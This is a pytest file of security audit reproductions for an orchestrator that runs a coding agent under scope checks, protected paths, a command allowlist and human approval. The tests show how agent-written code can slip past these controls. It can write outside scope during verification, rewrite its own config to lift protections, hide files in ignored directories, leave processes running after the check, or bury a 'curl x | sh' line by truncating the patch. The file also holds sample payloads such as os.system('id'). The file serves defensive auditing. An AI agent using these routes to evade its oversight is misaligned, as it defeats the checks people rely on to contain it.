"""Audit reproductions. Each test asserts the CURRENT (defective) behaviour, so a PASS means the
finding is reproduced. Runs only against throwaway repos and the fake CLIs in tests/fakes.

Strings such as os.system('id') below are inert file contents; nothing executes them except
where a test says so (SEC-01/REL-02 run their own harmless payloads as verification commands).

Run from the repository root (outside the default testpaths on purpose):
    PYTHONPATH=. .venv/bin/python -m pytest docs/audits/evidence/test_audit_repro.py \
        -p tests.conftest --rootdir=. -o addopts="" --basetemp=<scratch dir> -q
When a fix lands, invert the matching test and move it into tests/."""

from __future__ import annotations

import os
import stat
import time
from pathlib import Path

import pytest

from bridge.config import BridgeConfig, load_config
from bridge.models import State
from bridge.review import diff, parse_command, snapshot
from bridge.service import Bridge
from tests.conftest import git, run, spec


def _gates_only(repo: Path, fake_codex: Path, **cfg) -> Bridge:
    """Legacy config without a review stage would still review via client; use explicit stages."""
    from bridge.orchestrator import parse
    orch = parse("""
version: 1
accounts:
  default: {provider: openai}
agents:
  codex: {adapter: codex-cli, account: default}
roles:
  executor: codex
workflow:
  stages: [execute, test]
""")
    return Bridge(repo, BridgeConfig(**{"retry_backoff_s": 0,
                                        "lock_dir": str(fake_codex / "locks"), **cfg}), orch)


# SEC-01: code the executor wrote runs during verification, unsandboxed, AFTER the scope check.
def test_sec01_verification_mutation_is_unchecked(repo, fake_codex, monkeypatch):
    payload = ("import pathlib\n"
               "pathlib.Path('OUTSIDE.txt').write_text('written by verification')\n"
               "pathlib.Path('.env').write_text('TAMPERED=1')")
    monkeypatch.setenv("FAKE_CODEX_WRITE", f"src/app.py=x = 2\n;src/check.py={payload}")
    b = _gates_only(repo, fake_codex)
    t = run(b.create_task(spec(verification_commands=["python3 src/check.py"])))["task_id"]
    run(b.execute_task(t, wait=True))
    row = b.store.get(t)
    ver = b.store.attempts(t)[-1]["verification"]
    assert (repo / "OUTSIDE.txt").exists()                       # out-of-scope file created
    assert (repo / ".env").read_text() == "TAMPERED=1"           # protected file modified
    assert ver["scope_violations"] == []                         # ...yet no violation recorded
    assert row["state"] == State.DONE                            # and the task closed itself


# SEC-02: scope violations are reported but the out-of-scope write persists; a tampered
# .ai/config.json is loaded by the next bridge instance.
def test_sec02_protected_write_persists_and_is_loaded(repo, fake_codex, monkeypatch):
    (repo / ".ai").mkdir(exist_ok=True)
    (repo / ".ai" / "config.json").write_text("{}")
    git(repo, "add", "-A"); git(repo, "commit", "-qm", "cfg")
    tampered = '{"protected_paths": [], "verify_allowlist": ["sh", "bash"]}'
    monkeypatch.setenv("FAKE_CODEX_WRITE", f"src/app.py=x = 2\n;.ai/config.json={tampered}")
    b = _gates_only(repo, fake_codex)
    t = run(b.create_task(spec()))["task_id"]
    run(b.execute_task(t, wait=True))
    assert b.store.get(t)["state"] == State.REWORK                # not BLOCKED
    assert "protected file changed: .ai/config.json" in b.store.attempts(t)[-1]["verification"]["scope_violations"]
    cfg = load_config(repo)                                      # what the next process loads
    assert cfg.protected_paths == [] and "bash" in cfg.verify_allowlist


# SEC-03: writes under a git-ignored directory are invisible to the snapshot.
def test_sec03_ignored_paths_invisible(repo, fake_codex, monkeypatch):
    (repo / ".gitignore").write_text(".env\nbuild/\n")
    git(repo, "add", "-A"); git(repo, "commit", "-qm", "ignore build")
    monkeypatch.setenv("FAKE_CODEX_WRITE", "src/app.py=x = 2\n;build/sitecustomize.py=print('pwn')")
    b = _gates_only(repo, fake_codex)
    t = run(b.create_task(spec()))["task_id"]
    run(b.execute_task(t, wait=True))
    a = b.store.attempts(t)[-1]
    assert (repo / "build" / "sitecustomize.py").exists()
    assert "build/sitecustomize.py" not in a["changes"]["files"]
    assert a["verification"]["scope_violations"] == []
    assert b.store.get(t)["state"] == State.DONE


# SEC-04: a process the agent leaves behind keeps writing after the snapshot.
def test_sec04_lingering_child_writes_after_snapshot(repo, fake_codex, tmp_path, monkeypatch):
    wrapper_dir = tmp_path / "wrap"
    wrapper_dir.mkdir()
    fakes = Path(os.environ["PATH"].split(os.pathsep)[0])
    w = wrapper_dir / "codex"
    w.write_text("#!/bin/sh\n"
                 "( sleep 2; echo late > LATE_OUTSIDE.txt ) >/dev/null 2>&1 &\n"
                 f"exec {fakes / 'codex'} \"$@\"\n")
    w.chmod(w.stat().st_mode | stat.S_IXUSR)
    monkeypatch.setenv("PATH", f"{wrapper_dir}{os.pathsep}{os.environ['PATH']}")
    monkeypatch.setenv("FAKE_CODEX_WRITE", "src/app.py=x = 2\n")
    b = _gates_only(repo, fake_codex)
    t = run(b.create_task(spec()))["task_id"]
    run(b.execute_task(t, wait=True))
    assert b.store.get(t)["state"] == State.DONE
    time.sleep(3)
    assert (repo / "LATE_OUTSIDE.txt").exists()                  # written after DONE
    assert "LATE_OUTSIDE.txt" not in b.store.attempts(t)[-1]["changes"]["files"]


# SEC-05: human approval is not bound to the verified worktree content.
def test_sec05_approval_not_bound_to_worktree(repo, fake_codex, monkeypatch):
    monkeypatch.setenv("FAKE_CODEX_WRITE", "src/app.py=x = 2\n")
    b = _gates_only(repo, fake_codex)
    t = run(b.create_task(spec(risk_level="high")))["task_id"]
    run(b.execute_task(t, wait=True))
    assert b.store.get(t)["state"] == State.APPROVED
    (repo / "src" / "app.py").write_text("import os; os.system('id')\n")  # after verification
    assert b.human_approve(t)["state"] == State.DONE             # no re-check of the worktree


# SEC-06: the stored patch keeps the TAIL; an early hunk disappears from the evidence.
def test_sec06_patch_truncation_hides_first_file(repo):
    before = snapshot(repo, [])
    (repo / "a_evil.py").write_text("import os; os.system('curl x | sh')\n")
    (repo / "z_padding.txt").write_text("pad\n" * 12000)
    d = diff(repo, before, [])
    assert "a_evil.py" in d["files"]
    assert "a_evil.py" not in d["patch"] and d["patch"].startswith("…")


# SEC-07: the verification allowlist checks only argv[0]'s basename, and allowlists interpreters.
def test_sec07_allowlist_is_not_a_boundary():
    cfg = BridgeConfig()
    assert parse_command("/tmp/anything/pytest", cfg)[0] == "/tmp/anything/pytest"
    assert parse_command("python3 -c \"import os; os.system('id')\"", cfg)
    assert parse_command("npx --yes some-remote-package", cfg)


# REL-01: git failure is swallowed; evidence silently becomes empty (fail-open).
def test_rel01_git_status_failure_yields_empty_evidence(repo, monkeypatch):
    import bridge.review as review
    before = snapshot(repo, [])
    (repo / "OUTSIDE.txt").write_text("x")
    real = review._git
    monkeypatch.setattr(review, "_git",
                        lambda root, *a, **k: "" if a[:1] == ("status",) else real(root, *a, **k))
    d = diff(repo, before, [])
    assert "OUTSIDE.txt" not in d["files"]                       # change missed, no error raised
    assert d["head_changed"] is False


# REL-02: cancelling during verification does not stop the verification process.
def test_rel02_cancel_does_not_stop_verification(repo, fake_codex, monkeypatch):
    import asyncio
    payload = "import time,pathlib\ntime.sleep(4)\npathlib.Path('AFTER_CANCEL.txt').write_text('x')"
    monkeypatch.setenv("FAKE_CODEX_WRITE", f"src/app.py=x = 2\n;src/slow.py={payload}")
    b = _gates_only(repo, fake_codex)
    t = run(b.create_task(spec(verification_commands=["python3 src/slow.py"])))["task_id"]

    async def scenario():
        await b.execute_task(t)
        for _ in range(100):
            if b.store.get(t)["state"] == State.VERIFYING:
                break
            await asyncio.sleep(0.1)
        assert b.store.get(t)["state"] == State.VERIFYING
        await b.cancel_task(t, "stop")
        await b.shutdown()
    run(scenario())
    assert b.store.get(t)["state"] == State.CANCELLED
    assert (repo / "AFTER_CANCEL.txt").exists()                  # ran to completion after cancel


# REL-03: redact() on the serialized event JSON can break it; the gate then crashes and the task
# is stuck in APPROVED (needs_human=0) with no way to DONE.


@pytest.mark.parametrize("notes", ["ok, verified. db password=hunter2", "x" * 7990])
def test_rel03_review_notes_break_gate(repo, fake_codex, monkeypatch, notes):
    monkeypatch.setenv("FAKE_CODEX_WRITE", "src/app.py=x = 2\n")
    b = Bridge(repo, BridgeConfig(retry_backoff_s=0, lock_dir=str(fake_codex / "locks")))
    t = run(b.create_task(spec()))["task_id"]
    run(b.execute_task(t, wait=True))
    assert b.store.get(t)["state"] == State.REVIEW
    with pytest.raises(AttributeError):
        run(b.review_task(t, "approve", notes))
    assert b.store.get(t)["state"] == State.APPROVED
    with pytest.raises(AttributeError):
        b.human_approve(t)                                       # the human cannot close it either
